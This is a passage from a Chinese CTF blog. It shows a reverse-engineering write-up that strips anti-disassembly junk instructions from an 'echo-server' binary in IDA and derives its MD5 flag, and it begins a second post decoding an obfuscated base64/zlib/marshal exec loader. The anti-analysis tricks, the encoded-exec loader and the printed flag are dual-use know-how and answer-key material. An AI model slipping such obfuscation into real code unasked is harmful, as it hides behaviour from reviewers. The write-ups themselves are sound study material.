class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">JUMPOUT</span>(v3, (<span class="hljs-keyword">char</span> *)&amp;loc_80487C1 + <span class="hljs-number">1</span>);</span><br><span class="line"><span class="hljs-built_in">JUMPOUT</span>(!v3, (<span class="hljs-keyword">char</span> *)&amp;loc_80487C1 + <span class="hljs-number">1</span>);</span><br></pre></td></tr></tbody></table></figure><p>这里很明显是强行创造多条分支，IDA使用递归行进算法，就会默认这条路径接这两个函数执行过后的指令是有效的而去扫描分析后面的指令，但实际上，后面是永远不会到达的指令，不管v3的值是多少，都会跳转到<code>(char *)&amp;loc_80487C1 + 1</code>这显然是一条花指令，所以查看一下汇编代码准备去花</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">.text:0804875D ; Attributes: bp-based frame</span><br><span class="line">.text:0804875D</span><br><span class="line">.text:0804875D sub_804875D     proc near</span><br><span class="line">.text:0804875D</span><br><span class="line">.text:0804875D var_10          = dword ptr -10h</span><br><span class="line">.text:0804875D var_C           = dword ptr -0Ch</span><br><span class="line">.text:0804875D arg_0           = dword ptr  8</span><br><span class="line">.text:0804875D arg_4           = dword ptr  0Ch</span><br><span class="line">.text:0804875D</span><br><span class="line">.text:0804875D ; __unwind {</span><br><span class="line">.text:0804875D                 push    ebp</span><br><span class="line">.text:0804875E                 mov     ebp, esp</span><br><span class="line">.text:08048760                 sub     esp, 28h</span><br><span class="line">.text:08048763                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08048766                 mov     [ebp+var_10], eax</span><br><span class="line">.text:08048769                 cmp     [ebp+arg_0], 0</span><br><span class="line">.text:0804876D                 jnz     short loc_804877D</span><br><span class="line">.text:0804876F                 mov     dword ptr [esp], offset format ; "NULL"</span><br><span class="line">.text:08048776                 call    _printf</span><br><span class="line">.text:0804877B                 jmp     short loc_80487B1</span><br><span class="line">.text:0804877D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804877D</span><br><span class="line">.text:0804877D loc_804877D:                            ; CODE XREF: sub_804875D+10↑j</span><br><span class="line">.text:0804877D                 mov     [ebp+var_C], 0</span><br><span class="line">.text:08048784                 jmp     short loc_80487A9</span><br><span class="line">.text:08048786 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048786</span><br><span class="line">.text:08048786 loc_8048786:                            ; CODE XREF: sub_804875D+52↓j</span><br><span class="line">.text:08048786                 mov     eax, [ebp+var_10]</span><br><span class="line">.text:08048789                 lea     edx, [eax+1]</span><br><span class="line">.text:0804878C                 mov     [ebp+var_10], edx</span><br><span class="line">.text:0804878F                 movzx   eax, byte ptr [eax]</span><br><span class="line">.text:08048792                 movzx   eax, al</span><br><span class="line">.text:08048795                 mov     [esp+4], eax</span><br><span class="line">.text:08048799                 mov     dword ptr [esp], offset a02x ; "%02X"</span><br><span class="line">.text:080487A0                 call    _printf</span><br><span class="line">.text:080487A5                 add     [ebp+var_C], 1</span><br><span class="line">.text:080487A9</span><br><span class="line">.text:080487A9 loc_80487A9:                            ; CODE XREF: sub_804875D+27↑j</span><br><span class="line">.text:080487A9                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:080487AC                 cmp     eax, [ebp+arg_4]</span><br><span class="line">.text:080487AF                 jb      short loc_8048786</span><br><span class="line">.text:080487B1</span><br><span class="line">.text:080487B1 loc_80487B1:                            ; CODE XREF: sub_804875D+1E↑j</span><br><span class="line">.text:080487B1                 mov     dword ptr [esp], 0Ah ; c</span><br><span class="line">.text:080487B8                 call    _putchar</span><br><span class="line">.text:080487BD                 jz      short near ptr loc_80487C1+1</span><br><span class="line">.text:080487BF                 jnz     short near ptr loc_80487C1+1</span><br><span class="line">.text:080487C1</span><br><span class="line">.text:080487C1 loc_80487C1:                            ; CODE XREF: sub_804875D+60↑j</span><br><span class="line">.text:080487C1                                         ; sub_804875D+62↑j ...</span><br><span class="line">.text:080487C1                 call    near ptr 915A4B8Fh</span><br><span class="line">.text:080487C1 sub_804875D     endp ; sp-analysis failed</span><br><span class="line">.text:080487C1</span><br><span class="line">.text:080487C6</span><br><span class="line">.text:080487C6 loc_80487C6:                            ; DMA page register 74LS612:</span><br><span class="line">.text:080487C6                 in      eax, 81h        ; Channel 2 (diskette DMA)  (address bits 16-23)</span><br><span class="line">.text:080487C8                 in      al, dx</span><br><span class="line">.text:080487C9                 mov     [eax], al</span><br><span class="line">.text:080487C9 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></tbody></table></figure><p>这个函数显然是不对的，堆栈本身并没有平衡，<code>main</code>函数里跳到的地方是<code>0x080487C4</code>已经被其它指令占了，这里去花一下，多余的指令码干脆用<code>nop</code>patch掉</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">sub_804875D     proc near</span><br><span class="line">.text:0804875D</span><br><span class="line">.text:0804875D var_10          = dword ptr -10h</span><br><span class="line">.text:0804875D var_C           = dword ptr -0Ch</span><br><span class="line">.text:0804875D arg_0           = dword ptr  8</span><br><span class="line">.text:0804875D arg_4           = dword ptr  0Ch</span><br><span class="line">.text:0804875D</span><br><span class="line">.text:0804875D ; __unwind {</span><br><span class="line">.text:0804875D                 push    ebp</span><br><span class="line">.text:0804875E                 mov     ebp, esp</span><br><span class="line">.text:08048760                 sub     esp, 28h</span><br><span class="line">.text:08048763                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08048766                 mov     [ebp+var_10], eax</span><br><span class="line">.text:08048769                 cmp     [ebp+arg_0], 0</span><br><span class="line">.text:0804876D                 jnz     short loc_804877D</span><br><span class="line">.text:0804876F                 mov     dword ptr [esp], offset format ; "NULL"</span><br><span class="line">.text:08048776                 call    _printf</span><br><span class="line">.text:0804877B                 jmp     short loc_80487B1</span><br><span class="line">.text:0804877D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804877D</span><br><span class="line">.text:0804877D loc_804877D:                            ; CODE XREF: sub_804875D+10↑j</span><br><span class="line">.text:0804877D                 mov     [ebp+var_C], 0</span><br><span class="line">.text:08048784                 jmp     short loc_80487A9</span><br><span class="line">.text:08048786 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048786</span><br><span class="line">.text:08048786 loc_8048786:                            ; CODE XREF: sub_804875D+52↓j</span><br><span class="line">.text:08048786                 mov     eax, [ebp+var_10]</span><br><span class="line">.text:08048789                 lea     edx, [eax+1]</span><br><span class="line">.text:0804878C                 mov     [ebp+var_10], edx</span><br><span class="line">.text:0804878F                 movzx   eax, byte ptr [eax]</span><br><span class="line">.text:08048792                 movzx   eax, al</span><br><span class="line">.text:08048795                 mov     [esp+4], eax</span><br><span class="line">.text:08048799                 mov     dword ptr [esp], offset a02x ; "%02X"</span><br><span class="line">.text:080487A0                 call    _printf</span><br><span class="line">.text:080487A5                 add     [ebp+var_C], 1</span><br><span class="line">.text:080487A9</span><br><span class="line">.text:080487A9 loc_80487A9:                            ; CODE XREF: sub_804875D+27↑j</span><br><span class="line">.text:080487A9                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:080487AC                 cmp     eax, [ebp+arg_4]</span><br><span class="line">.text:080487AF                 jb      short loc_8048786</span><br><span class="line">.text:080487B1</span><br><span class="line">.text:080487B1 loc_80487B1:                            ; CODE XREF: sub_804875D+1E↑j</span><br><span class="line">.text:080487B1                 mov     dword ptr [esp], 0Ah ; c</span><br><span class="line">.text:080487B8                 call    _putchar</span><br><span class="line">.text:080487BD                 jz      short locret_80487C2</span><br><span class="line">.text:080487BF                 jnz     short locret_80487C2</span><br><span class="line">.text:080487C1                 nop                     ; Keypatch modified this from:</span><br><span class="line">.text:080487C1                                         ;   db 0E8h</span><br><span class="line">.text:080487C2</span><br><span class="line">.text:080487C2 locret_80487C2:                         ; CODE XREF: sub_804875D+60↑j</span><br><span class="line">.text:080487C2                                         ; sub_804875D+62↑j</span><br><span class="line">.text:080487C2                 leave</span><br><span class="line">.text:080487C3                 retn</span><br><span class="line">.text:080487C3 ; } // starts at 804875D</span><br><span class="line">.text:080487C3 sub_804875D     endp</span><br></pre></td></tr></tbody></table></figure><p>这是这个函数本来的样子，而<code>main</code>函数里面调用的根本就不是这个函数，而是下面</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:080487C4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080487C4 ; __unwind {</span><br><span class="line">.text:080487C4                 push    ebp             ; CODE XREF: main+49↓p</span><br><span class="line">.text:080487C5                 mov     ebp, esp</span><br><span class="line">.text:080487C7                 sub     esp, 88h</span><br><span class="line">.text:080487CD                 mov     eax, large gs:14h</span><br><span class="line">.text:080487D3                 mov     [ebp-0Ch], eax</span><br><span class="line">.text:080487D6                 xor     eax, eax</span><br><span class="line">.text:080487D8                 mov     dword ptr [esp+8], 14h</span><br><span class="line">.text:080487E0                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:080487E8                 lea     eax, [ebp-70h]</span><br><span class="line">.text:080487EB                 mov     [esp], eax</span><br><span class="line">.text:080487EE                 call    _memset</span><br><span class="line">.text:080487F3</span><br><span class="line">.text:080487F3 loc_80487F3:                            ; CODE XREF: .text:loc_80487F3↑j</span><br><span class="line">.text:080487F3                 jmp     short near ptr loc_80487F3+1</span><br><span class="line">.text:080487F3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080487F5                 db 0C0h</span><br><span class="line">.text:080487F6                 db  48h ; H</span><br><span class="line">.text:080487F7                 db 0C7h</span><br></pre></td></tr></tbody></table></figure><p>下面并没有分析，因为又遇到了一个花指令</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:080487F3                 jmp     short near ptr loc_80487F3+1</span><br></pre></td></tr></tbody></table></figure><p>代码重叠，分析一下本来的指令是什么</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">text:080487F4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080487F4                 inc     eax</span><br><span class="line">.text:080487F6                 dec     eax</span><br><span class="line">.text:080487F7                 mov     dword ptr [esp+8], 14h</span><br><span class="line">.text:080487FF                 lea     eax, [ebp-70h]</span><br><span class="line">.text:08048802                 mov     [esp+4], eax</span><br><span class="line">.text:08048806                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804880D                 call    _read</span><br><span class="line">.text:08048812                 xor     eax, eax</span><br><span class="line">.text:08048814                 jz      short loc_804881D</span><br><span class="line">.text:08048816                 jmp     near ptr 6F44B961h</span><br></pre></td></tr></tbody></table></figure><p>又来</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048812                 xor     eax, eax</span><br><span class="line">.text:08048814                 jz      short loc_804881D</span><br></pre></td></tr></tbody></table></figure><p>自己和自己异或肯定是0，这个跳转是一定会实现的，后面的语句并没有什么用但是IDA还是进行了分析然后出错，patch掉继续看</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:08048816                 nop                     ; Keypatch modified this from:</span><br><span class="line">.text:08048816                                         ;   db 0E9h</span><br><span class="line">.text:08048816 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048817 aF1Ga           db 'F1@gA',0</span><br><span class="line">.text:0804881D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804881D</span><br><span class="line">.text:0804881D loc_804881D:                            ; CODE XREF: .text:08048814↑j</span><br><span class="line">.text:0804881D                 mov     dword ptr [esp+8], 5</span><br><span class="line">.text:08048825                 mov     dword ptr [esp+4], 8048817h</span><br><span class="line">.text:0804882D                 lea     eax, [ebp-70h]</span><br><span class="line">.text:08048830                 mov     [esp], eax</span><br><span class="line">.text:08048833                 call    _strncmp</span><br><span class="line">.text:08048838                 test    eax, eax</span><br><span class="line">.text:0804883A                 jnz     short loc_80488A3</span><br><span class="line">.text:0804883C                 mov     dword ptr [esp], offset aYouAreVeryClos ; "You are very close! Now patch me~"</span><br><span class="line">.text:08048843                 call    _puts</span><br><span class="line">.text:08048848                 mov     eax, ds:dword_804A088</span><br><span class="line">.text:0804884D                 test    eax, eax</span><br><span class="line">.text:0804884F                 jz      short loc_8048866</span><br></pre></td></tr></tbody></table></figure><p>去花之后变成了一个字符串，后面还有一个比较操作，如果输入这个字符串，就会输出<code>You are very close! Now patch me~</code></p><p>后面肯定还有操作，往后面看</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048848                 mov     eax, ds:dword_804A088</span><br><span class="line">.text:0804884D                 test    eax, eax</span><br><span class="line">.text:0804884F                 jz      short loc_8048866</span><br></pre></td></tr></tbody></table></figure><p>这三句很关键，如果<code>eax</code>是0，就会进行后面的跳转，所以查找一下<code>ds:dword_804A088</code>交叉引用，在<code>main</code>里面发现</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:08048913                 mov     ds:dword_804A088, 1</span><br></pre></td></tr></tbody></table></figure><p>所以这个跳转是永远不会实现的，先看看不跳转后面会执行什么</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048851 loc_8048851:                            ; CODE XREF: .text:08048857↓j</span><br><span class="line">.text:08048851                 mov     ax, 5EBh</span><br><span class="line">.text:08048855                 xor     eax, eax</span><br><span class="line">.text:08048857                 jz      short near ptr loc_8048851+1</span><br></pre></td></tr></tbody></table></figure><p>又是一个花指令，重新分析这几句</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048852 loc_8048852:                            ; CODE XREF: .text:08048857↓j</span><br><span class="line">.text:08048852                 mov     eax, 0C03105EBh</span><br><span class="line">.text:08048857                 jz      short loc_8048852</span><br></pre></td></tr></tbody></table></figure><p>发现进入了一个死循环，所以题目让我们patch的意思是不走这个循环，也就是真正应该执行的是前面没走的那个分支</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">loc_8048866:                            ; CODE XREF: .text:0804884F↑j</span><br><span class="line">.text:08048866                 lea     eax, [ebp-70h]</span><br><span class="line">.text:08048869                 mov     [esp], eax</span><br><span class="line">.text:0804886C                 call    _strlen</span><br><span class="line">.text:08048871                 mov     dword ptr [esp+8], 0</span><br><span class="line">.text:08048879                 mov     [esp+4], eax</span><br><span class="line">.text:0804887D                 lea     eax, [ebp-70h]</span><br><span class="line">.text:08048880                 add     eax, 1</span><br><span class="line">.text:08048883                 mov     [esp], eax</span><br><span class="line">.text:08048886                 call    _MD5</span><br><span class="line">.text:0804888B                 mov     [ebp-74h], eax</span><br><span class="line">.text:0804888E                 mov     dword ptr [esp+4], 10h</span><br><span class="line">.text:08048896                 mov     eax, [ebp-74h]</span><br><span class="line">.text:08048899                 mov     [esp], eax</span><br><span class="line">.text:0804889C                 call    sub_804875D</span><br><span class="line">.text:080488A1                 jmp     short loc_80488C0</span><br><span class="line">.text:080488A3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080488A3</span><br><span class="line">.text:080488A3 loc_80488A3:                            ; CODE XREF: .text:0804883A↑j</span><br><span class="line">.text:080488A3                 lea     eax, [ebp-70h]</span><br><span class="line">.text:080488A6                 mov     [esp], eax</span><br><span class="line">.text:080488A9                 call    _strlen</span><br><span class="line">.text:080488AE                 sub     eax, 1</span><br><span class="line">.text:080488B1                 mov     [esp+4], eax</span><br><span class="line">.text:080488B5                 lea     eax, [ebp-70h]</span><br><span class="line">.text:080488B8                 mov     [esp], eax</span><br><span class="line">.text:080488BB                 call    sub_804875D</span><br><span class="line">.text:080488C0</span><br><span class="line">.text:080488C0 loc_80488C0:                            ; CODE XREF: .text:080488A1↑j</span><br><span class="line">.text:080488C0                 mov     eax, ds:stdout</span><br><span class="line">.text:080488C5                 mov     [esp], eax</span><br><span class="line">.text:080488C8                 call    _fflush</span><br><span class="line">.text:080488CD                 mov     eax, [ebp-0Ch]</span><br><span class="line">.text:080488D0                 xor     eax, large gs:14h</span><br><span class="line">.text:080488D7                 jz      short locret_80488DE</span><br><span class="line">.text:080488D9                 call    ___stack_chk_fail</span><br><span class="line">.text:080488DE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080488DE</span><br><span class="line">.text:080488DE locret_80488DE:                         ; CODE XREF: .text:080488D7↑j</span><br><span class="line">.text:080488DE                 leave</span><br><span class="line">.text:080488DF                 retn</span><br><span class="line">.text:080488DF ; } // starts at 80487C4</span><br></pre></td></tr></tbody></table></figure><p>执行到结束，计算了一个<code>md5</code>然后调用最开始分析的<code>sub_804875D</code>函数以16进制的形式输出，所以这里有两个选择，有linux环境可以直接patch跳转语句然后执行得到flag</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt;./echo-server </span><br><span class="line">               **************</span><br><span class="line">               Echo Server 0.3 ALPHA</span><br><span class="line">               **************</span><br><span class="line">F1@gA</span><br><span class="line">You are very close! Now patch me~</span><br><span class="line">F8C60EB40BF66919A77C4BD88D45DEF4</span><br></pre></td></tr></tbody></table></figure><p>当然也可以自己算<code>md5</code>，看看关键函数</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:08048866                 lea     eax, [ebp-70h]</span><br><span class="line">.text:08048869                 mov     [esp], eax</span><br><span class="line">.text:0804886C                 call    _strlen</span><br><span class="line">.text:08048871                 mov     dword ptr [esp+8], 0</span><br><span class="line">.text:08048879                 mov     [esp+4], eax</span><br><span class="line">.text:0804887D                 lea     eax, [ebp-70h]</span><br><span class="line">.text:08048880                 add     eax, 1</span><br><span class="line">.text:08048883                 mov     [esp], eax</span><br><span class="line">.text:08048886                 call    _MD5</span><br></pre></td></tr></tbody></table></figure><p>首先是把我们输入的字符串的地址拷贝到<code>eax</code>中，把该地址写到栈顶，调用<code>_strlen</code>，求的就是我们输入的字符串的长度，我们输入的是<code>'F1@gA\n'</code>，返回的值是<code>0x06</code>，储存在eax中，写到了栈顶的第二个位置（第三个位置的0并不知道什么意思，或许是第三个参数，没查到函数原型，暂时先不管了），但是栈顶元素并不是我们输入的字符串，而是首地址加1的位置，长度还是6，所以要用<code>md5</code>加密的字符串应该是<code>'1@gA\x0a\x00'</code>，<code>python</code>调用<code>hashlib</code>算一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line">m=hashlib.md5()</span><br><span class="line">m.update(<span class="hljs-string">b'1@gA\x0a\x00'</span>)</span><br><span class="line">m.hexdigest().upper()</span><br><span class="line"><span class="hljs-comment">#'F8C60EB40BF66919A77C4BD88D45DEF4'</span></span><br></pre></td></tr></tbody></table></figure><p>两种方法都可以得到flag</p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F8C60EB40BF66919A77C4BD88D45DEF4</span><br></pre></td></tr></tbody></table></figure><p>其实这题并没有什么难度，为什么写这么长呢？</p><p><del>(实在不想写数据结构作业)</del></p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 花指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>handcrafted-pyc-攻防世界</title>
      <link href="/2020/03/16/handcrafted-pyc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/16/handcrafted-pyc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>很早以前就想写一篇关于python的字节码的文章，但是一直没什么时间，借着刚好做到这一题，写一写我对相关内容的理解。</p><span id="more"></span><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>拿到的题目并不是一个pyc格式的文件</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> marshal, zlib, base64</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">exec</span>(marshal.loads(zlib.decompress(base64.b64decode(<span class="hljs-string">'eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ=='</span>))))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>通过解码之后运行，提示输入密码，将其转为pyc格式的文件</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> marshal, zlib, base64</span><br><span class="line"><span class="hljs-keyword">import</span> imp</span><br><span class="line"></span><br><span class="line">b64d = base64.b64decode(<span 